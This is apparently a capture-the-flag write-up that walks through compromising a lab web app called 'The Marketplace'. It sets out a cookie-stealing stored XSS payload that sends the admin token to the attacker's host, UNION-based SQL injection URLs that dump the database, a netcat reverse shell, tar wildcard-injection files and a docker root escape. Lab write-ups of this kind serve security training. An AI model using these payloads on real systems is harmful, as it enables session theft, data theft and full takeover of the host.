# The Marketplace
### Difficulty: Medium
------------------------------------------------------

Let's start with nmap scan:
```bash
nmap -sV -sC 10.10.243.219 | tee nmap/start
```

The results:
```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c83cc56265eb7f5d9224e93b11b523b9 (RSA)
|   256 06b799940b091439e17fbfc75f99d39f (ECDSA)
|_  256 0a75bea260c62b8adf4f457161ab60b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
|_http-server-header: nginx/1.19.2
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The SSH version is high enough to not be vulnerable, so I'll start with the http service.

In the scan it was also found that in the robots.txt directory there is a "/admin" directory.

![image](https://user-images.githubusercontent.com/114166939/232095399-3b9e8fbb-7b3c-458f-8a36-1401c960d4cb.png)

It's forbidden:

![image](https://user-images.githubusercontent.com/114166939/232224360-2a9fe600-df3f-4528-94c9-cb36032fcfc6.png)


I'll sign up with a test account:

username = test,

password = test.

![image](https://user-images.githubusercontent.com/114166939/232096934-f68dfe06-c1d5-490a-b58b-ab601e0f38af.png)

Success!

Now let's login to this user:

![image](https://user-images.githubusercontent.com/114166939/232097504-f3174c72-dcdc-46f5-b534-c4b3c167054a.png)

Success!



Also noticed I have cookie now - using the Firefox cookie manager extension.

![image](https://user-images.githubusercontent.com/114166939/232098050-972050bf-9921-4b3d-b38a-9164f17e2832.png)

By using CyberChef (from "https://gchq.github.io/CyberChef/") I can understand what type of encode this server use and what is the data stored in the cookie.

![image](https://user-images.githubusercontent.com/114166939/232099019-3d27ee92-fea8-4aaa-9126-7386e1e678bc.png)

```
{
    "userId": 4,
    "username": "test",
    "admin": false,
    "iat": 1681488332
}
```

So the server probably identify the users by "userId" and "username" parameters.

This information will be helpful in the near future!

Let's move on to the "New listing" ("http://10.10.243.219/new") page:

![image](https://user-images.githubusercontent.com/114166939/232100022-ae881109-485a-4a4f-8020-d827fb8569c4.png)

I'll try exploit this page with xss payloads,

For beginning, I'll try the simplest payload in the title input:
```html
<script>alert(1)</script>
```
It didn't work:

![image](https://user-images.githubusercontent.com/114166939/232100940-7a66c85d-2dbd-4908-b04c-aad6c5327ceb.png)

Let's try the description input:

![image](https://user-images.githubusercontent.com/114166939/232101091-70b6a894-ece1-420a-a82d-63718944d837.png)

It works!

![image](https://user-images.githubusercontent.com/114166939/232224429-f9fe1f0b-75dc-40fc-89b3-f7148081f11f.png)

Also when I'm navigating to the home page and clicking on this listing the alert pops out.

This is a stored XSS!

The 2 options for this listing are: "Contact the listing author" and 
"Report listing to admins" - when I report the listing the following message appears:

![image](https://user-images.githubusercontent.com/114166939/232110868-dbbdf845-0b1e-4333-834b-67b03616991e.png)

Which means that after I reported the listing, an admin opened it!
If that's the case I can try steal the admin's cookie.

I'll use a payload from this github page "https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md":
(The Silent One-Liner)
```html
<script>var i=new Image;i.src="http://[IP]:[PORT]/?"+document.cookie;</script>
```
It needs to be modified to my "tun0" IP, and port.

Before add the listing, I'll establish python3 server on my attacker machine:
```bash
python3 -m http.server
```
I'll add the payload:

![image](https://user-images.githubusercontent.com/114166939/232113668-933bb211-5ef9-4292-883c-694e716b164e.png)

Report this listing:

![image](https://user-images.githubusercontent.com/114166939/232113844-a5f8b17e-37d0-486d-bd42-e5f3e1ef06e2.png)

Refresh, and let's take a look at my python3 server!

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.14.50.11 - - [14/Apr/2023 13:20:31] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjgxNDg4MzMyfQ.LOu-eEsb_vaK-pZ8xZjVHvaVNuFRjRzyq3yAps2tAnY HTTP/1.1" 200 -

10.10.243.219 - - [14/Apr/2023 13:21:26] "GET /?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2ODE0OTI4ODd9.YI1C9_Iu632z1-0xDX1jm0DUeFwiGgqiDR1joEGcKzw HTTP/1.1" 200 -
```

The first one is my current user cookie, the same one as I checked in my cookie manager extension.

The second request I got have different cookie!
Probably the admin's user cookie, I'll check it in CyberChef:

![image](https://user-images.githubusercontent.com/114166939/232114890-be430831-c00a-4d33-a986-4fdc666f62ee.png)

It's michael's cookie.

Now I can change the current user cookie to michael's user cookie - I'll do it with cookie manager:

Copy the token from the request, delete the current cookie, paste michael's cookie and save.

![image](https://user-images.githubusercontent.com/114166939/232116054-9115e1c8-2f66-41e3-af69-4716606596f0.png)


Refresh the home page:

![image](https://user-images.githubusercontent.com/114166939/232116191-be8c47ea-9607-4b36-a73f-d35913a8fb9e.png)

There is a new option in the website, "Administration panel", it redirect to the "/admin" directory.

Got the first flag:

![image](https://user-images.githubusercontent.com/114166939/232116820-b3ed3d55-4cfd-415c-b758-86d5308e4c77.png)

Now let's click on the system user:

![image](https://user-images.githubusercontent.com/114166939/232224601-1d468d6d-be9f-4319-863a-329525949f36.png)

This page use GET method and maybe vulnerable to sqli in the "user" parameter - "http://10.10.243.219/admin?user=1".

The easiest way to test the url is to add ' and check its response:
```url
http://10.10.243.219/admin?user=1'
```

![image](https://user-images.githubusercontent.com/114166939/232117835-abc95af0-4082-4703-929a-afa263519e99.png)

It's probably vulnerable, also it written that this website use MySQL server!

Let's try find out how much columns are in the tables of this DataBase with SQL injection,
I'll add the "order by" payload to the url:
```url
http://10.10.243.219/admin?user=1 order by 1-- -
```

It responded the same - so I'll increase the column numbers until the website will responds differently:

```url
http://10.10.243.219/admin?user=1 order by 2-- -
http://10.10.243.219/admin?user=1 order by 3-- -
http://10.10.243.219/admin?user=1 order by 4-- -
http://10.10.243.219/admin?user=1 order by 5-- -
```

5 columns make an error, so the conclusion is that the table has 4 columns:

![image](https://user-images.githubusercontent.com/114166939/232224802-6d24f723-e9b9-4ae0-9f13-2ea59de55475.png)

Let's find out if one of them is printable on the page with 'union select' sql payload:

(I'll add impossible value to the user parameter so it'll print only what I choose to print)
```url
http://10.10.243.219/admin?user=-999 union select 1,2,3,4-- -
```

![image](https://user-images.githubusercontent.com/114166939/232225067-efa9a623-c4a5-4e86-8d25-47a85a4b6668.png)

The first and second values are printable!

I'lll use the default database "information_schema" to get all details:

For start I'm going to ask the database what schemas are in there with the command:
```url
http://10.10.243.219/admin?user=-999 union select group_concat(schema_name),2,3,4 from information_schema.schemata-- -
```

Results:

![image](https://user-images.githubusercontent.com/114166939/232225532-dc3651e4-0472-4037-a351-e4938aa20d98.png)

I want to see what tables "marketplace" schema have:

```url
http://10.10.243.219/admin?user=-999 union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='marketplace'-- -
```

Results:

![image](https://user-images.githubusercontent.com/114166939/232225654-986f46cc-6f2d-45d9-ace6-a65722491897.png)

Now, let's check what's inside "messages" table:

```url
http://10.10.243.219/admin?user=-999 union select group_concat(column_name),2,3,4 from information_schema.columns where table_schema='marketplace' and table_name='messages'-- -
```

Results:

![image](https://user-images.githubusercontent.com/114166939/232225759-2334b75d-5ec9-4459-8ab3-5a95fa5a5821.png)

I'll dump the information from "message_content" column:

```url
http://10.10.243.219/admin?user=-999 union select group_concat(message_content),2,3,4 from marketplace.messages-- -
```

Results:

![image](https://user-images.githubusercontent.com/114166939/232226217-d26b5422-acb2-411a-bcb5-353e6e43ae3a.png)


Now I can login to the SSH service with the password I got.

There are only 4 users in the system, one of them is mine, so I can automate it with hydra or check it manually.

Because it's only 3 users, I did it manually and found that the user which got this password is "jake".

I'll login as jake via SSH:

```bash
ssh jake@10.10.243.219
```

I have a shell as "jake" user!

![image](https://user-images.githubusercontent.com/114166939/232226349-f5c1d98d-abac-4bca-821b-b2adcc33979e.png)

First thing I'll do is to get the second flag, "user.txt" file, which locate in the home directory of "jake" user:

![image](https://user-images.githubusercontent.com/114166939/232226711-4e583a0c-9549-4ea4-b15e-41bd8e85cfb6.png)

Second thing to check is what groups this user belongs to and what permissions he has:
```bash
id
```

Results:

![image](https://user-images.githubusercontent.com/114166939/232226534-c41a0f5d-1666-4f1c-b31b-65820e7303ae.png)

```bash
sudo -l
```

Results:

![image](https://user-images.githubusercontent.com/114166939/232226516-e00e4895-5b5c-4dbd-8025-e361dfcaeb87.png)

The only thing this user can do as "michael" user is to run "/opt/backups/backup.sh" bash file.

I'll go this location and print this file:

```bash
cd /opt/backups/ && cat backup.sh
```

![image](https://user-images.githubusercontent.com/114166939/232226894-10ca44ec-8427-46f9-8638-11d47f4ab6fd.png)

The content of this bash file means that it will take all the content of "/opt/backups/" and archive it to the "backup.tar" archive.


![image](https://user-images.githubusercontent.com/114166939/232227008-81441152-846b-47ef-843d-1bd9defa3cf7.png)

The "backup.sh" file owned by "michael" user and the "backup.tar" owned by "jake" user.

There is a known vulnerability with the "tar" command and wildcard which also mentioned in GTFOBins ("https://gtfobins.github.io/") under "tar -> Sudo".

![image](https://user-images.githubusercontent.com/114166939/232227193-bfd17a2d-ee06-4751-911d-ec6e1d618235.png)

I'll use this technique to exploit this machine and get access to "michael" user.

For this purpose I'll use this article "https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/" under "Tar Wildcard Injection (1st method)" and will modify it for my own needs:

I'll start by generating a payload for the reverse shell using the "msfvenom" tool:
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[MY-IP] lport=6666 R
```

Got the following results:
```bash
mkfifo /tmp/husncp; nc [MY-IP] 6666 0</tmp/husncp | /bin/sh >/tmp/husncp 2>&1; rm /tmp/husncp
```

Next, I'll echo this command inside a file called "shell.sh":
```bash
echo "mkfifo /tmp/lzeh; nc [MY-IP] 6666 0</tmp/lzeh | /bin/sh >/tmp/lzeh 2>&1; rm /tmp/lzeh" > shell.sh
```

Now, the following two commands:
```bash
echo "" > "--checkpoint-action=exec=sh shell.sh" && echo "" > --checkpoint=1
```

All left to do is:

Give "shell.sh" and "backup.tar" all permissions to avoid errors:
```bash
chmod 777 shell.sh && chmod 777 backup.tar
```

![image](https://user-images.githubusercontent.com/114166939/232228562-a7e09ea8-a673-4754-b6ed-a24af9bfc997.png)

Establish netcat listener on the attacker machine:
```bash
nc -lnvp 6666
```

And run the the "backup.sh" bash script as "michael" user by using the command:
```bash
sudo -u michael ./backup.sh
```

Got a shell as "michael" user!

![image](https://user-images.githubusercontent.com/114166939/232228748-3020a9de-dc7a-43cf-bd13-ab527a7f1501.png)

First, I'll upgarde this sh shell with python to get a bash shell:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

As a user I don't know. I'll check what groups and permissions this user has:
```bash
id
```

Results:

![image](https://user-images.githubusercontent.com/114166939/232228827-e4e23072-e09e-436d-ab8e-f5c2b3f560c4.png)


```bash
sudo -l
```

No results because password needed.

I see this user is a member of the "docker" group!

Quick peek at GTFOBins under "docker -> Shell" will show simple command to get a privilege escalation and shell as a root:

![image](https://user-images.githubusercontent.com/114166939/232229187-a8b1b2cc-d944-467e-8c2b-b6bc9f099a06.png)

Let's use this command on michael's shell:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Got the root user!

![image](https://user-images.githubusercontent.com/114166939/232229647-ce1a4a28-6755-4fc3-9825-0554db2c471f.png)

Now all left to do is print the final flag, "root.txt" file, which located in the root home directory:

![image](https://user-images.githubusercontent.com/114166939/232229786-bd76972c-731d-4578-8513-b87b1a28f995.png)
